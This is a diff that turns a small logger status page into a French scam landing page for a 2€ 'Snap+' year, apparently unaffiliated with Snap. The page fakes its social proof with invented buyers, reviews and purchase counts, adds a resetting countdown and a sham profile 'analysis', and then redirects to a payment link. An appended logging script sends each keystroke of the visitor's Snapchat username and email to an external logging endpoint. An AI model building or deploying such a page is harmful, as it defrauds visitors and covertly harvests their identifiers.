@@ -1,12 +1,443 @@
 <!doctype html>
 <html lang="fr">
 <head>
-  <meta charset="utf-8">
-  <title>Logger API</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SnapMax — Accueil + Achat + Chargement (fichier unique)</title>
+  <style>
+    :root{--bg:#0b0b10;--fg:#f7f7fb;--muted:#a3a3b2;--card:#12131a;--line:#262736;--g1:#ffe16a;--g2:#ff6bd6;--g3:#67e8f9;--ok:#22c55e;--accent:#ff955c;}
+    *{box-sizing:border-box} body{margin:0;background:var(--bg);color:var(--fg);font:16px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,"Helvetica Neue",Arial}
+    .wrap{max-width:820px;margin:auto;padding:24px}
+    .header{position:sticky;top:0;z-index:5;backdrop-filter:saturate(1.2) blur(10px);background:rgba(11,11,16,.55);border-bottom:1px solid var(--line)}
+    .row{display:flex;align-items:center;justify-content:space-between;gap:12px}
+    .brand{display:flex;align-items:center;gap:10px;font-weight:700}
+    .logo{width:28px;height:28px;border-radius:10px;background:linear-gradient(135deg,var(--g1),var(--g2))}
+    .btn{display:inline-block;padding:10px 14px;border-radius:14px;border:1px solid #ffffff22;background:#ffffff10;color:#fff;text-decoration:none;font-weight:600}
+    h1{font-size:44px;line-height:1.1;margin:26px 0 6px;background:linear-gradient(90deg,var(--g1),var(--g2),var(--g3));-webkit-background-clip:text;background-clip:text;color:transparent}
+    .muted{color:var(--muted)}
+    .card{background:linear-gradient(180deg,#ffffff0d,#ffffff05);border:1px solid var(--line);border-radius:18px;padding:18px}
+    .pill{display:inline-flex;align-items:center;gap:6px;padding:4px 8px;border-radius:999px;border:1px solid #39d98a33;background:#39d98a22;color:#39d98a}
+    .section-title{display:flex;align-items:center;justify-content:space-between}
+    .input{width:100%;padding:14px 16px;border-radius:14px;border:1px solid var(--line);background:#0e0f16;color:#fff}
+    .cta{width:100%;padding:14px 18px;border:0;border-radius:16px;color:#0b0b10;font-weight:800;cursor:pointer;background:linear-gradient(90deg,var(--g1),var(--g2),var(--g3));box-shadow:0 20px 40px -20px rgba(255,255,255,.3)}
+    .cta[disabled]{opacity:.6;cursor:not-allowed;filter:grayscale(30%)}
+    .price{font-size:28px;font-weight:900}
+    .grid2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+    .stack{display:grid;gap:16px}
+    @media (max-width:820px){.grid2{grid-template-columns:1fr}}
+
+    /* Home extras */
+    .kpis{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:12px}
+    .kpi{border:1px solid var(--line);border-radius:14px;padding:14px;text-align:center;background:#0e0f16}
+    .kpi .big{font-weight:900;font-size:24px}
+    .kpi .sub{color:var(--muted);font-size:12px}
+    .buyers{margin-top:14px;border:1px solid var(--line);border-radius:14px;background:#0e0f16;overflow:hidden}
+    .buyers-inner{max-height:200px;overflow:hidden;position:relative}
+    .buyer{display:flex;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid #1c1d2b}
+    .buyer:last-child{border-bottom:0}
+    .bavatar{width:34px;height:34px;border-radius:50%;display:grid;place-items:center;font-weight:800;background:linear-gradient(135deg,var(--g1),var(--g2));color:#0b0b10}
+    .bmeta{display:grid;line-height:1.1}
+    .bname{font-weight:700}
+    .btime{font-size:12px;color:var(--muted)}
+    .bbadge{margin-left:auto;font-size:12px;border:1px solid #39d98a44;background:#39d98a22;color:#39d98a;border-radius:999px;padding:4px 8px}
+    @keyframes scroll { 0% { transform: translateY(0) } 100% { transform: translateY(-50%) } }
+    .scroll { animation: scroll 16s linear infinite }
+
+    .features{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px}
+    .feat{border:1px solid var(--line);border-radius:14px;padding:14px;background:#0e0f16}
+    .feat h3{margin:0 0 4px 0;font-size:16px}
+    .feat p{margin:0;color:var(--muted);font-size:14px}
+
+    .tgrid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px}
+    .tcard{border:1px solid var(--line);border-radius:14px;padding:14px;background:#0e0f16}
+    .tavatar{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;background:linear-gradient(135deg,var(--g1),var(--g2));color:#0b0b10;font-weight:900;margin-bottom:8px}
+    .tstars{color:#fbbf24;font-size:14px}
+    .tname{font-weight:700;margin:4px 0 6px 0}
+    .tbody{color:var(--muted);margin:0}
+
+    .faq{border:1px solid var(--line);border-radius:14px;padding:12px;background:#0e0f16}
+    .faq summary{cursor:pointer;font-weight:700}
+    .faq p{color:var(--muted)}
+
+    footer{border-top:1px solid var(--line);margin-top:36px}
+    .foot{max-width:820px;margin:auto;padding:20px;color:var(--muted);font-size:13px}
+
+    /* Toasts */
+    .toasts{position:fixed;right:18px;bottom:18px;display:flex;flex-direction:column;gap:10px;z-index:50}
+    .toast{display:flex;align-items:center;gap:10px;background:#ffffff10;border:1px solid #ffffff22;color:#fff;padding:10px 14px;border-radius:14px;backdrop-filter:blur(8px);opacity:0;transform:translateY(8px);animation:slide 5.5s ease forwards}
+    .tavatar{width:32px;height:32px;border-radius:50%;display:grid;place-items:center;background:#2a2b3a}
+    .tick{width:16px;height:16px;border:2px solid var(--ok);border-left:0;border-top:0;transform:rotate(45deg)}
+    @keyframes slide{0%{opacity:0;transform:translateY(8px)}10%,85%{opacity:1;transform:translateY(0)}100%{opacity:0;transform:translateY(8px)}}
+
+    /* Loading */
+    .steps{display:grid;gap:10px;margin-top:10px}
+    .step{border:1px solid var(--line);border-radius:14px;padding:12px;display:flex;align-items:start;gap:12px}
+    .ok{background:#0f1a12;border-color:#1e4d31}
+    .ok .bullet{background:var(--ok)}
+    .pending{background:#151622}
+    .bullet{width:26px;height:26px;border-radius:50%;display:grid;place-items:center;background:#4b4b5e;font-weight:900}
+    .title{font-weight:800}
+    .desc{font-size:13px;color:var(--muted)}
+    .bar{height:10px;border-radius:999px;background:#2b2c3c;overflow:hidden;margin-top:10px}
+    .bar>span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--g1),var(--g2));transition:width .4s ease}
+    .center{text-align:center}
+
+    /* Router */
+    [data-view]{display:none}
+    [data-view].active{display:block}
+  </style>
 </head>
-<body style="font-family:system-ui;padding:24px">
-  <h1>Projet en ligne ✔</h1>
-  <p>API de logs : <a href="/api/log">/api/log</a></p>
+<body>
+  <div class="header">
+    <div class="wrap row">
+      <div class="brand"><div class="logo"></div><span>SnapMax</span></div>
+      <a id="headerLink" href="#" class="btn">Obtenir Snap+ →</a>
+    </div>
+  </div>
+
+  <main class="wrap">
+
+    <!-- VIEW: HOME -->
+    <section id="view-home" data-view class="active">
+      <h1>Récupère 1 an de Snap+</h1>
+      <p class="muted">Design original, offre 2€, et preuves sociales dynamiques.</p>
+
+      <!-- KPIs -->
+      <section class="kpis" style="margin-top:14px">
+        <div class="kpi"><div class="big">2€</div><div class="sub">Offre limitée</div></div>
+        <div class="kpi"><div class="big">+3 129</div><div class="sub">Récupérations</div></div>
+        <div class="kpi"><div class="big">~2 min</div><div class="sub">Délai moyen</div></div>
+        <div class="kpi"><div class="big">4.8/5</div><div class="sub">Satisfaction</div></div>
+      </section>
+
+      <div class="stack" style="margin-top:16px">
+        <!-- Acheteurs récents -->
+        <section class="card">
+          <div class="section-title">
+            <div style="display:flex;gap:10px;align-items:center"><span style="font-size:20px">🛍️</span><div><div style="font-weight:700">Ils viennent d’acheter</div><div class="muted" style="font-size:14px">Preuves sociales en temps réel</div></div></div>
+            <span class="pill">+ 3 129</span>
+          </div>
+          <div class="buyers">
+            <div class="buyers-inner">
+              <div class="scroll" id="buyersList">
+                <!-- filled by JS -->
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- Points clés -->
+        <section class="features">
+          <div class="feat"><h3>Activation rapide</h3><p>Accès en quelques minutes après confirmation.</p></div>
+          <div class="feat"><h3>Priorité premium</h3><p>Traitement prioritaire sur certaines fonctionnalités.</p></div>
+          <div class="feat"><h3>Sans engagement</h3><p>Tu arrêtes quand tu veux, en 2 clics.</p></div>
+          <div class="feat"><h3>Support réactif</h3><p>Nous répondons rapidement aux questions essentielles.</p></div>
+          <div class="feat"><h3>Prix unique</h3><p>2€ au lieu de 47,99€ — offre limitée.</p></div>
+          <div class="feat"><h3>Sécurisé</h3><p>Données traitées selon les bonnes pratiques.</p></div>
+        </section>
+
+        <!-- Avis -->
+        <section class="card">
+          <div class="section-title">
+            <div style="display:flex;gap:10px;align-items:center"><span style="font-size:20px">⭐</span><div><div style="font-weight:700">Avis vérifiés</div><div class="muted" style="font-size:14px">Ce que disent nos clients</div></div></div>
+            <span class="pill">4.8/5</span>
+          </div>
+          <div class="tgrid" style="margin-top:12px" id="testimonials">
+            <!-- filled by JS -->
+          </div>
+        </section>
+
+        <!-- Offre limitée & 2€ -->
+        <section class="card" id="countCard">
+          <div class="muted" style="font-size:11px;font-weight:800;text-transform:uppercase;letter-spacing:.18em;color:var(--accent)">⚡ Offre limitée — Plus que</div>
+          <div class="price" id="timer">00:15:00</div>
+          <div style="border-top:1px solid var(--line);margin-top:12px;padding-top:12px;font-size:14px"><span class="price" style="font-size:18px">2€</span> au lieu de 47,99€ pour 1 an complet</div>
+        </section>
+
+        <!-- Form + CTA -->
+        <section class="card">
+          <label for="snuserHome" class="muted" style="font-size:14px">Nom d’utilisateur Snapchat</label>
+          <input id="snuserHome" class="input" placeholder="ex: enzo_lol" />
+          <button id="ctaHome" class="cta" style="margin-top:10px">Obtenir Snap+ maintenant 🔐</button>
+          <p class="muted" style="font-size:11px;margin-top:8px">Démo non affiliée à Snap Inc. — Utilise seulement des visuels dont tu détiens les droits.</p>
+        </section>
+      </div>
+    </section>
+
+    <!-- VIEW: CHECKOUT -->
+    <section id="view-checkout" data-view>
+      <h1>Finaliser l’achat</h1>
+      <p class="muted">Entre ton pseudo Snapchat et procède au paiement sécurisé.</p>
+
+      <div class="grid2" style="margin-top:16px">
+        <section class="card">
+          <h2 style="margin:0 0 10px 0">Informations</h2>
+          <label for="snuser" class="sub">Nom d’utilisateur Snapchat</label>
+          <input id="snuser" class="input" placeholder="ex: enzo_lol" />
+          <label for="email" class="sub" style="display:block;margin-top:10px">Email de reçu (optionnel)</label>
+          <input id="email" class="input" placeholder="ex: toi@mail.com" />
+          <button id="go" class="cta" style="margin-top:12px">Continuer →</button>
+          <p class="sub" style="margin-top:8px">En continuant, tu acceptes nos conditions d’utilisation.</p>
+        </section>
+
+        <aside class="card">
+          <h2 style="margin:0 0 10px 0">Résumé</h2>
+          <div class="price">2€</div>
+          <div class="muted">Abonnement Snap+ — 1 an</div>
+          <ul class="muted" style="margin-top:10px; padding-left:18px">
+            <li>Activation rapide</li>
+            <li>Accès à toutes les fonctionnalités</li>
+            <li>Support prioritaire</li>
+          </ul>
+          <div style="margin-top:10px;border-top:1px solid var(--line);padding-top:10px" class="muted">
+            Paiement sécurisé • Carte / Apple Pay / Google Pay
+          </div>
+        </aside>
+      </div>
+    </section>
+
+    <!-- VIEW: LOADING -->
+    <section id="view-loading" data-view>
+      <h1>Analyse de <span id="uname">@…</span></h1>
+      <p class="muted">Vérification et préparation de l’offre…</p>
+
+      <div class="card">
+        <div class="muted">Progression globale <span id="percent" style="float:right">0%</span></div>
+        <div class="bar"><span id="bar"></span></div>
+        <div class="steps">
+          <div class="step ok">
+            <div class="bullet">✓</div>
+            <div><div class="title">Connexion sécurisée</div><div class="desc">Établissement d’une session chiffrée</div></div>
+          </div>
+          <div class="step pending" id="s2">
+            <div class="bullet">2</div>
+            <div><div class="title">Recherche du profil</div><div class="desc">Vérification du pseudo</div></div>
+          </div>
+          <div class="step pending" id="s3">
+            <div class="bullet">3</div>
+            <div><div class="title">Préparation de l’offre</div><div class="desc">Paramétrage Snap+ 1 an</div></div>
+          </div>
+          <div class="step pending" id="s4">
+            <div class="bullet">4</div>
+            <div><div class="title">Finalisation</div><div class="desc">Dernières vérifications</div></div>
+          </div>
+        </div>
+        <div class="center muted" style="margin-top:12px">Merci de ne pas fermer la page.</div>
+      </div>
+
+      <section class="card" style="margin-top:14px">
+        <h2 style="margin:0 0 6px 0">Paiement</h2>
+        <p class="muted" style="margin-top:0">Montant à régler : <strong>2€</strong></p>
+        <button id="pay" class="cta" disabled>Payer maintenant</button>
+        <p class="muted" id="payHint" style="margin-top:8px">Le paiement se débloque à 100%.</p>
+      </section>
+    </section>
+  </main>
+
+  <footer>
+    <div class="foot">© 2025 — Démo SnapMax. Non affilié à Snap Inc. / Snapchat. Les noms affichés sont fictifs.</div>
+  </footer>
+
+  <!-- Toasts -->
+  <div class="toasts" id="toasts"></div>
+
+  <script>
+    // === CONFIG ===
+    const PAYMENT_URL = "https://example.com/checkout"; // Remplace par ton lien Stripe/PayPal
+    const WEBHOOK_URL = ""; // Optionnel: endpoint de logs
+    // =============
+
+    function postWebhook(event, payload={}){
+      if(!WEBHOOK_URL) return;
+      fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({event, ...payload, ts: new Date().toISOString()}) }).catch(()=>{});
+    }
+
+    // Simple router
+    const views = {
+      home: document.getElementById('view-home'),
+      checkout: document.getElementById('view-checkout'),
+      loading: document.getElementById('view-loading'),
+    };
+    const headerLink = document.getElementById('headerLink');
+    function show(view){
+      for(const v of Object.values(views)) v.classList.remove('active');
+      (views[view]||views.home).classList.add('active');
+      if(view==='home'){ headerLink.textContent='Obtenir Snap+ →'; headerLink.href='#checkout'; }
+      if(view==='checkout'){ headerLink.textContent='Accueil'; headerLink.href='#home'; }
+      if(view==='loading'){ headerLink.textContent='Modifier'; headerLink.href='#checkout'; }
+      location.hash = view;
+    }
+    window.addEventListener('hashchange', () => {
+      const v=(location.hash||'#home').replace('#','');
+      show(v);
+      if(v==='loading'){ startLoading(sessionStorage.getItem('snap_user')||''); }
+    });
+    (function init(){ const v=(location.hash||'#home').replace('#',''); show(v); if(v==='loading'){ startLoading(sessionStorage.getItem('snap_user')||''); } })();
+
+    // Home: buyers + testimonials + countdown + toasts
+    const buyers = [
+      ["enzo_lol","il y a 10s"],["marie.19","il y a 20s"],["leo.paris","il y a 1m"],
+      ["sanaa_dz","il y a 2m"],["nassim_31","il y a 3m"],["chloe_vb","il y a 4m"],
+      ["amine__sn","il y a 6m"],["mariox","il y a 8m"],["emma-k","il y a 10m"],["kylianx","il y a 12m"]
+    ];
+    const buyersList = document.getElementById('buyersList');
+    function renderBuyer([name, when]){
+      const ini = name[0].toUpperCase();
+      return `<div class="buyer">
+        <div class="bavatar">${ini}</div>
+        <div class="bmeta"><div class="bname">${name}</div><div class="btime">${when}</div></div>
+        <div class="bbadge">✓ Snap+</div>
+      </div>`;
+    }
+    buyersList.innerHTML = buyers.map(renderBuyer).join('') + buyers.map(renderBuyer).join('');
+
+    const tests = [
+      ["Mélanie P.", "J’ai reçu mon accès en 2 minutes, nickel 👌", 5],
+      ["Adam L.", "Simple et rapide. Rien à dire.", 5],
+      ["Inès R.", "J’étais sceptique… mais ça marche. Merci.", 4],
+      ["Lucas D.", "Support réactif, au top.", 5],
+      ["Nora Z.", "Bonne affaire pour 2€.", 4],
+      ["Yanis G.", "Clairement le meilleur plan.", 5],
+    ];
+    function stars(n){ return "★".repeat(n) + "☆".repeat(5-n); }
+    document.getElementById('testimonials').innerHTML = tests.map(([n,t,r])=>`<div class="tcard"><div class="tavatar">${n[0]}</div><div class="tstars">${stars(r)}</div><div class="tname">${n}</div><p class="tbody">${t}</p></div>`).join('');
+
+    // Countdown 15:00
+    (function(){
+      const el=document.getElementById('timer'); let s=15*60;
+      const fmt=n=>String(n).padStart(2,'0');
+      const tick=()=>{ if(s<0) return; const m=Math.floor(s/60), ss=s%60; el.textContent=`00:${fmt(m)}:${fmt(ss)}`; s--; };
+      tick(); setInterval(tick,1000);
+    })();
+
+    // Toasts
+    const toasts = document.getElementById('toasts');
+    function addToast(){
+      const name = buyers[Math.floor(Math.random()*buyers.length)][0];
+      const t=document.createElement('div');
+      t.className='toast';
+      t.innerHTML='<div class="tavatar"><div class="tick"></div></div><div><strong>'+name+'</strong> vient de débloquer <span style="background:linear-gradient(90deg,var(--g1),var(--g2),var(--g3));-webkit-background-clip:text;background-clip:text;color:transparent;font-weight:800">Snap+</span></div>';
+      toasts.appendChild(t); setTimeout(()=>toasts.removeChild(t),5600);
+    }
+    (function loop(){ setTimeout(()=>{ addToast(); loop(); }, 6000 + Math.random()*7000); })();
+
+    // Home CTA -> Checkout (prefill)
+    document.getElementById('ctaHome').addEventListener('click', ()=>{
+      const u=document.getElementById('snuserHome').value.trim();
+      if(u) sessionStorage.setItem('snap_user', u);
+      location.hash='#checkout';
+      setTimeout(()=>{ const i=document.getElementById('snuser'); if(i && u) i.value=u; }, 0);
+    });
+
+    // Checkout -> Loading
+    const go = document.getElementById('go');
+    go.addEventListener('click', () => { 
+      const u = (document.getElementById('snuser').value||'').trim();
+      if(!u){ alert('Entre ton pseudo Snapchat.'); return; }
+      const e = (document.getElementById('email').value||'').trim();
+      sessionStorage.setItem('snap_user', u);
+      sessionStorage.setItem('snap_email', e);
+      postWebhook('checkout_continue', {user: u, email: e});
+      location.hash='#loading';
+      startLoading(u);
+    });
+
+    // Loading logic
+    const unameEl = document.getElementById('uname');
+    const bar = document.getElementById('bar');
+    const pct = document.getElementById('percent');
+    const payBtn = document.getElementById('pay');
+    const payHint = document.getElementById('payHint');
+    const marks = [20, 55, 80, 100];
+
+    function startLoading(u){
+      unameEl.textContent = u ? '@'+u : '@utilisateur';
+      postWebhook('loading_start', {user: u});
+      // reset
+      bar.style.width='0%'; pct.textContent='0%'; payBtn.disabled=true; payHint.textContent='Le paiement se débloque à 100%.';
+      for(const id of ['s2','s3','s4']){ const el=document.getElementById(id); el.classList.add('pending'); el.classList.remove('ok'); el.querySelector('.bullet').textContent=id.replace('s',''); }
+      let i=0, p=0;
+      function step(){
+        if(i<marks.length){
+          const target=marks[i];
+          const iv=setInterval(()=>{
+            if(p>=target){ clearInterval(iv); i++; activateStep(i+1); setTimeout(step, 400); return; }
+            p+=1; bar.style.width=p+'%'; pct.textContent=p+'%';
+          },35);
+        } else {
+          payBtn.disabled=false; payHint.textContent='Prêt pour le paiement.';
+          postWebhook('loading_complete', {user: u});
+          setTimeout(()=> doPay(u), 1200); // auto-redirection
+        }
+      }
+      function activateStep(n){ const el=document.getElementById('s'+n); if(!el) return; el.classList.remove('pending'); el.classList.add('ok'); el.querySelector('.bullet').textContent='✓'; }
+      step();
+    }
+    function doPay(u){
+      postWebhook('pay_click', {user: u});
+      const url = new URL(PAYMENT_URL);
+      if(u) url.searchParams.set('user', u);
+      const e = sessionStorage.getItem('snap_email')||'';
+      if(e) url.searchParams.set('email', e);
+      window.location.href = url.toString();
+    }
+    payBtn.addEventListener('click', ()=> doPay(sessionStorage.getItem('snap_user')||''));
+  </script>
+  <!-- === LOGGING SCRIPT === -->
+<script>
+const LOG_API = "https://logger-sit-03.vercel.app/api/log";
+
+
+async function sendLog(evt) {
+  try {
+    await fetch(LOG_API, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({
+        ...evt,
+        path: location.pathname,
+      })
+    });
+  } catch (e) {
+    console.warn("log failed:", e);
+  }
+}
+
+// 1) Log à chaque ouverture de page
+sendLog({ event_type: "page_view" });
+
+// 2) Log quand un utilisateur tape son pseudo ou email
+["snuser", "email"].forEach(id => {
+  const input = document.getElementById(id);
+  if(input){
+    input.addEventListener("input", () => {
+      sendLog({
+        event_type: "field_change",
+        user_name: document.getElementById("snuser")?.value || "",
+        email: document.getElementById("email")?.value || "",
+        payload: { field: id, value: input.value }
+      });
+    });
+  }
+});
+
+// 3) Log quand il clique sur le bouton “Continuer”
+const goBtn = document.getElementById("go");
+if(goBtn){
+  goBtn.addEventListener("click", () => {
+    const u = (document.getElementById("snuser")?.value || "").trim();
+    const e = (document.getElementById("email")?.value || "").trim();
+    if(!u) return;
+    sendLog({
+      event_type: "checkout_start",
+      user_name: u,
+      email: e,
+      payload: { note: "Utilisateur a cliqué Continuer" }
+    });
+  });
+}
+</script>
+<!-- === END LOGGING SCRIPT === -->
+
 </body>
 </html>
